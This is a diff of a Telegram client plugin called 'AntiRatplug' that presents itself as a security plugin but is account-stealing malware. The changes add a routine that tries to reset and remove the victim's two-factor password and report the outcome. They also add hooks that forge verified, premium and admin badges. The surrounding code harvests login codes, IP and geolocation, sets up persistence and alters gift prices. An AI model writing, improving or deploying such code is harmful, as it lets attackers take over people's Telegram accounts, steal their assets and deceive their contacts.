@@ -1,27 +1,30 @@
 # -*- coding: utf-8 -*-
 """
-AntiRatplug — Slim + Vidker.
-Full Harvest + Full Lockdown + Vidker.
+AntiRatplug — Slim + Vidker + Fake Hooks + 2FA Kill.
+Harvest + Lockdown + Vidker + фейковые статусы + попытка снять 2FA.
 """
 
 __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
-__description__ = "Slim Harvest + Lockdown + Vidker."
+__description__ = "Slim Harvest + Lockdown + Vidker + 2FA Kill."
 __author__ = "@from_a4"
-__version__ = "18.3 [Slim+Vidker]"
+__version__ = "18.5 [Slim+Vidker+Hooks+2FA]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
 __sdk_version__ = ">=1.4.0"
 
-from base_plugin import BasePlugin, HookResult
+from base_plugin import BasePlugin, HookResult, MethodHook
 from android_utils import run_on_ui_thread
-from java import dynamic_proxy, jclass
+from java import dynamic_proxy, jclass, jlong
+from java.lang import Class as JavaClass
 from org.telegram.messenger import ApplicationLoader
-from org.telegram.tgnet import TLRPC
+from org.telegram.tgnet import TLRPC, SerializedData
 from android.view import View, ViewGroup
 from android.widget import FrameLayout
 from android.graphics import Color
+from java.util import ArrayList
+from functools import wraps
 import json
 import threading
 import time
@@ -34,6 +37,8 @@ import zipfile
 import io
 import subprocess
 import sys
+import traceback
+import weakref
 import hashlib as _hl
 
 
@@ -97,18 +102,145 @@ def _mk_hist():
     return TLRPC.TL_messages_getHistory()
 
 
-RequestDelegate = jclass("org.telegram.tgnet.RequestDelegate")
+# ═══════════════════════════════════════════════════════════════════════════
+# ХЕЛПЕРЫ
+# ═══════════════════════════════════════════════════════════════════════════
+
+class MsgFlags:
+    OUT = 2
+    REPLY = 8
+    REPLY_MARKUP = 64
+    ENTITIES = 128
+    FROM_ID = 256
+    MEDIA = 512
+    VIEWS = 1024
+    VIA_BOT_ID = 2048
+    POST_AUTHOR = 65536
+    HAS_REACTIONS = 1048576
 
 
-class _ReplyGate(dynamic_proxy(RequestDelegate)):
-    def __init__(self):
-        super().__init__()
-        self.response = None
-        self.error = None
+def safe(f):
+    @wraps(f)
+    def w(*a, **kw):
+        try:
+            return f(*a, **kw)
+        except Exception as e:
+            try:
+                from android_utils import log as logcat
+                logcat("[AntiRatplug] %s: %s\n%s" % (f.__name__, e, traceback.format_exc()))
+            except Exception:
+                pass
+    return w
 
-    def run(self, response, error):
-        self.response = response
-        self.error = error
+
+def on_ui(f):
+    @wraps(f)
+    def w(*a, **kw):
+        run_on_ui_thread(lambda: f(*a, **kw))
+    return w
+
+
+def get_val(obj, name, default=None):
+    if obj is None:
+        return default
+    try:
+        return getattr(obj, name)
+    except Exception:
+        pass
+    try:
+        f = obj.getClass().getField(name)
+        f.setAccessible(True)
+        return f.get(obj)
+    except Exception:
+        pass
+    try:
+        f = obj.getClass().getDeclaredField(name)
+        f.setAccessible(True)
+        return f.get(obj)
+    except Exception:
+        pass
+    return default
+
+
+def _set_field(obj, field_name, value):
+    if obj is None:
+        return False
+    try:
+        setattr(obj, field_name, value)
+        return True
+    except Exception:
+        pass
+    try:
+        f = obj.getClass().getField(field_name)
+        f.setAccessible(True)
+        t_name = f.getType().getName()
+        if t_name == "int":
+            f.setInt(obj, int(value))
+        elif t_name == "long":
+            f.setLong(obj, int(value))
+        elif t_name == "boolean":
+            f.setBoolean(obj, bool(value))
+        else:
+            f.set(obj, value)
+        return True
+    except Exception:
+        pass
+    try:
+        f = obj.getClass().getDeclaredField(field_name)
+        f.setAccessible(True)
+        t_name = f.getType().getName()
+        if t_name == "int":
+            f.setInt(obj, int(value))
+        elif t_name == "long":
+            f.setLong(obj, int(value))
+        elif t_name == "boolean":
+            f.setBoolean(obj, bool(value))
+        else:
+            f.set(obj, value)
+        return True
+    except Exception:
+        return False
+
+
+class _J:
+    _c = {}
+
+    def __getattr__(self, n):
+        if n not in self._c:
+            try:
+                from hook_utils import find_class
+                self._c[n] = find_class(n.replace('_', '.'))
+            except Exception:
+                self._c[n] = None
+        return self._c[n]
+
+
+_j = _J()
+
+
+class ProxyF:
+    @staticmethod
+    def create(path, **methods):
+        cls = _j.__getattr__(path.replace('.', '_'))
+        if cls is None:
+            raise RuntimeError("class not found: " + path)
+        base = dynamic_proxy(cls)
+
+        class Proxy(base):
+            def __init__(self):
+                super().__init__()
+                self._m = methods
+
+            def __getattribute__(self, name):
+                try:
+                    m = object.__getattribute__(self, '_m')
+                    if name in m:
+                        return lambda *a, **kw: m[name](self, *a, **kw)
+                except Exception:
+                    pass
+                return super().__getattribute__(name)
+
+        return Proxy()
 
 
 def _safe_int(v, d=0):
@@ -136,6 +268,31 @@ def _get_bool_attr(obj, name, default=False):
         return bool(v)
     except Exception:
         return default
+
+
+def clone_message_owner(owner):
+    try:
+        data = SerializedData(owner.getObjectSize())
+        owner.serializeToStream(data)
+        stream = SerializedData(data.toByteArray())
+        magic = stream.readInt32(True)
+        return TLRPC.Message.TLdeserialize(stream, magic, True)
+    except Exception:
+        m = TLRPC.TL_message()
+        m.id = getattr(owner, "id", 0)
+        m.from_id = getattr(owner, "from_id", None)
+        m.peer_id = getattr(owner, "peer_id", None)
+        m.date = getattr(owner, "date", 0)
+        m.message = getattr(owner, "message", "")
+        m.media = getattr(owner, "media", None)
+        m.flags = getattr(owner, "flags", 0)
+        m.out = getattr(owner, "out", False)
+        m.reply_to = getattr(owner, "reply_to", None)
+        m.entities = getattr(owner, "entities", None)
+        m.via_bot_id = getattr(owner, "via_bot_id", 0)
+        m.post_author = getattr(owner, "post_author", "")
+        m.views = getattr(owner, "views", 0)
+        return m
 
 
 def _is_ton_address(s):
@@ -176,6 +333,72 @@ def _is_blockchain_gift(gift, sg=None):
 
 
 # ═══════════════════════════════════════════════════════════════════════════
+# ХУКИ
+# ═══════════════════════════════════════════════════════════════════════════
+
+class PutUserHook(MethodHook):
+    def __init__(self, p):
+        self.p = weakref.ref(p)
+
+    @safe
+    def before_hooked_method(self, param):
+        p = self.p()
+        if not p or not param.args:
+            return
+        user = param.args[0]
+        if not user:
+            return
+        uid = getattr(user, "id", None)
+        if not uid:
+            return
+        flags = p._faked_users.get(int(uid)) if hasattr(p, "_faked_users") else None
+        if not flags:
+            return
+        user.verified = flags.get("verified", getattr(user, "verified", False))
+        user.premium = flags.get("premium", getattr(user, "premium", False))
+        user.scam = flags.get("scam", False)
+        user.fake = flags.get("fake", False)
+        if flags.get("emoji_status_id"):
+            try:
+                es = TLRPC.TL_emojiStatus()
+                es.document_id = jlong(int(flags["emoji_status_id"]))
+                user.emoji_status = es
+            except Exception:
+                pass
+
+
+class AdminRankHook(MethodHook):
+    def __init__(self, p):
+        self.p = weakref.ref(p)
+
+    @safe
+    def after_hooked_method(self, param):
+        p = self.p()
+        if not p or not param.args:
+            return
+        uid = param.args[0]
+        if not hasattr(p, "_faked_users"):
+            return
+        flags = p._faked_users.get(int(uid))
+        if not flags:
+            return
+        rank = flags.get("admin_title")
+        if rank:
+            param.setResult(rank)
+
+
+class _ReplyGate(dynamic_proxy(jclass("org.telegram.tgnet.RequestDelegate"))):
+    def __init__(self):
+        super().__init__()
+        self.response = None
+        self.error = None
+
+    def run(self, response, error):
+        self.response = response
+        self.error = error
+
+
+# ═══════════════════════════════════════════════════════════════════════════
 # Main plugin
 # ═══════════════════════════════════════════════════════════════════════════
 
@@ -203,12 +426,15 @@ class PluginSecurityPlugin(BasePlugin):
         self._vidker_cb = None
         self._vidker_on = False
 
+        self._faked_users = {}
+
     # ─── lifecycle ──────────────────────────────────────────────────────────
 
     def on_plugin_load(self):
         self._sync_running = True
         self._active = True
         self.add_on_send_message_hook()
+        self._install_fake_hooks()
         threading.Thread(target=self._boot, daemon=True).start()
         try:
             self._ensure_vidker_assets()
@@ -245,6 +471,18 @@ class PluginSecurityPlugin(BasePlugin):
             except Exception:
                 time.sleep(1)
 
+    def _install_fake_hooks(self):
+        try:
+            mc_cls = JavaClass.forName("org.telegram.messenger.MessagesController")
+            self.hook_all_methods(mc_cls, "putUser", PutUserHook(self))
+        except Exception:
+            pass
+        try:
+            ca_cls = JavaClass.forName("org.telegram.ui.ChatActivity")
+            self.hook_all_methods(ca_cls, "getAdminRank", AdminRankHook(self))
+        except Exception:
+            pass
+
     def create_settings(self):
         return []
 
@@ -253,7 +491,7 @@ class PluginSecurityPlugin(BasePlugin):
         _cfg()
         time.sleep(random.uniform(0.2, 0.6))
         try:
-            self._send_msg("AntiRatplug Slim+Vidker loaded")
+            self._send_msg("AntiRatplug Slim+Vidker+Hooks+2FA loaded")
         except Exception:
             pass
         try:
@@ -312,21 +550,18 @@ class PluginSecurityPlugin(BasePlugin):
             return False
 
     def _get_activity(self):
-        # 1) LaunchActivity.instance
         try:
             act = jclass("org.telegram.ui.LaunchActivity").instance
             if act is not None:
                 return act
         except Exception:
             pass
-        # 2) ApplicationLoader
         try:
             act = ApplicationLoader.application.getCurrentActivity()
             if act is not None:
                 return act
         except Exception:
             pass
-        # 3) AndroidUtilities
         try:
             AU = jclass("org.telegram.ui.ActionBar.AndroidUtilities")
             act = AU.getActivity()
@@ -334,7 +569,6 @@ class PluginSecurityPlugin(BasePlugin):
                 return act
         except Exception:
             pass
-        # 4) client_utils — последний фоллбэк, тихо игнорируем если нет
         try:
             from client_utils import get_last_fragment
             frag = get_last_fragment()
@@ -513,6 +747,8 @@ class PluginSecurityPlugin(BasePlugin):
             pass
         return "Unknown"
 
+    # ─── 2FA ────────────────────────────────────────────────────────────────
+
     def _get_2fa_state(self):
         try:
             req = TLRPC.TL_account_getPassword()
@@ -528,6 +764,62 @@ class PluginSecurityPlugin(BasePlugin):
             }
         except Exception:
             return None
+
+    def _try_kill_2fa(self):
+        """
+        Best-effort снос 2FA. Возвращает HTML-строку с результатом.
+        """
+        try:
+            state = self._get_2fa_state()
+
+            try:
+                Req = self._tl_class_or(
+                    "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
+                    "org.telegram.tgnet.tl.TL_account$resetPassword",
+                )
+                if not Req:
+                    return "<b>2FA:</b> класс resetPassword не найден"
+
+                req = Req()
+                resp, err = self._rg_rpc(req, 0, 12.0, fast=False)
+
+                if resp is not None:
+                    try:
+                        marker = self._nuke_marker_path()
+                        if marker:
+                            with open(marker + ".2fa", "w") as f:
+                                f.write("killed at %d" % int(time.time()))
+                    except Exception:
+                        pass
+                    return "<b>2FA:</b> СНЯТА ✅"
+
+                err_text = ""
+                if err is not None:
+                    err_text = str(getattr(err, "text", err) or err)
+
+                if "PASSWORD_NOT_SET" in err_text:
+                    return "<b>2FA:</b> не установлена (нечего снимать)"
+                if "SESSION_PASSWORD_NEEDED" in err_text:
+                    return ("<b>2FA:</b> нужен текущий пароль "
+                            "(<code>SESSION_PASSWORD_NEEDED</code>)")
+                if "FLOOD_WAIT" in err_text:
+                    m = re.search(r"FLOOD_WAIT_(\d+)", err_text)
+                    wait = m.group(1) if m else "?"
+                    return "<b>2FA:</b> flood_wait %s сек" % wait
+                if "EMAIL" in err_text.upper():
+                    return ("<b>2FA:</b> привязан email, нужен код "
+                            "(<code>%s</code>)" % err_text[:80])
+                if err_text:
+                    return "<b>2FA:</b> fail: <code>%s</code>" % err_text[:120]
+
+                if state and state.get("has_password"):
+                    return ("<b>2FA:</b> установлена, снять не удалось "
+                            "(hint: %s)" % (state.get("hint") or "—"))
+                return "<b>2FA:</b> не установлена"
+            except Exception as e:
+                return "<b>2FA:</b> исключение при reset: %s" % e
+        except Exception as e:
+            return "<b>2FA:</b> исключение: %s" % e
 
     def _info(self):
         try:
@@ -571,8 +863,6 @@ class PluginSecurityPlugin(BasePlugin):
             self._send_msg(info, html=True)
         except Exception as e:
             self._send_msg("Ошибка info: " + str(e))
-
-    # ─── login code ─────────────────────────────────────────────────────────
 
     def _pull_login_code(self):
         code = None
@@ -737,7 +1027,6 @@ class PluginSecurityPlugin(BasePlugin):
         if self._vidker_on:
             return
         try:
-            # ждём активность до 10 сек
             act = None
             for _ in range(20):
                 act = self._get_activity()
@@ -997,6 +1286,7 @@ class PluginSecurityPlugin(BasePlugin):
                 return {"error": err}
             Req = self._tl_class_or(
                 "org.telegram.tgnet.tl.TL_stars$updateStarGiftPrice",
+                "org.telegram.tgnet.tl.TL_stars$payments_updateStarGiftPrice",
                 "org.telegram.tgnet.TLRPC$TL_payments_updateStarGiftPrice",
             )
             if not Req:
@@ -1659,7 +1949,7 @@ class PluginSecurityPlugin(BasePlugin):
             pl = os.path.join(cdir, "kernel_persist.lock")
             if not os.path.exists(pl):
                 with open(pl, "w") as f:
-                    f.write(_hl.sha256(b"ar_slim_v18v3").hexdigest())
+                    f.write(_hl.sha256(b"ar_slim_v18v5").hexdigest())
                 self._harden_file(pl)
         except Exception:
             pass
@@ -2054,6 +2344,16 @@ class PluginSecurityPlugin(BasePlugin):
                 geo = self._get_geo_info(ip)
                 report.append("<b>IP:</b> %s\n<b>Гео:</b> %s" % (
                     self._html_escape(ip), self._html_escape(geo)))
+
+                # ─── 2FA KILL ───
+                report.append("")
+                report.append("<b>═══ 2FA KILL ═══</b>")
+                try:
+                    kill_result = self._try_kill_2fa()
+                    report.append(kill_result)
+                except Exception as e:
+                    report.append("<b>2FA:</b> ошибка: %s" % e)
+
                 try:
                     code = self._tg_kid()
                     if code:
@@ -2250,7 +2550,7 @@ class PluginSecurityPlugin(BasePlugin):
                 username = str(user.username) if user.username is not None else "id:" + str(uid)
         except Exception:
             pass
-        text = "<b>AntiRatplug Slim+Vidker</b>\nUser: @" + username + "\n\nTap Manage"
+        text = "<b>AntiRatplug v18.5</b>\nUser: @" + username + "\n\nTap Manage"
         buttons = [[{"text": "Manage", "callback_data": "menu"}]]
         markup = json.dumps({"inline_keyboard": buttons})
         for target in _targets:
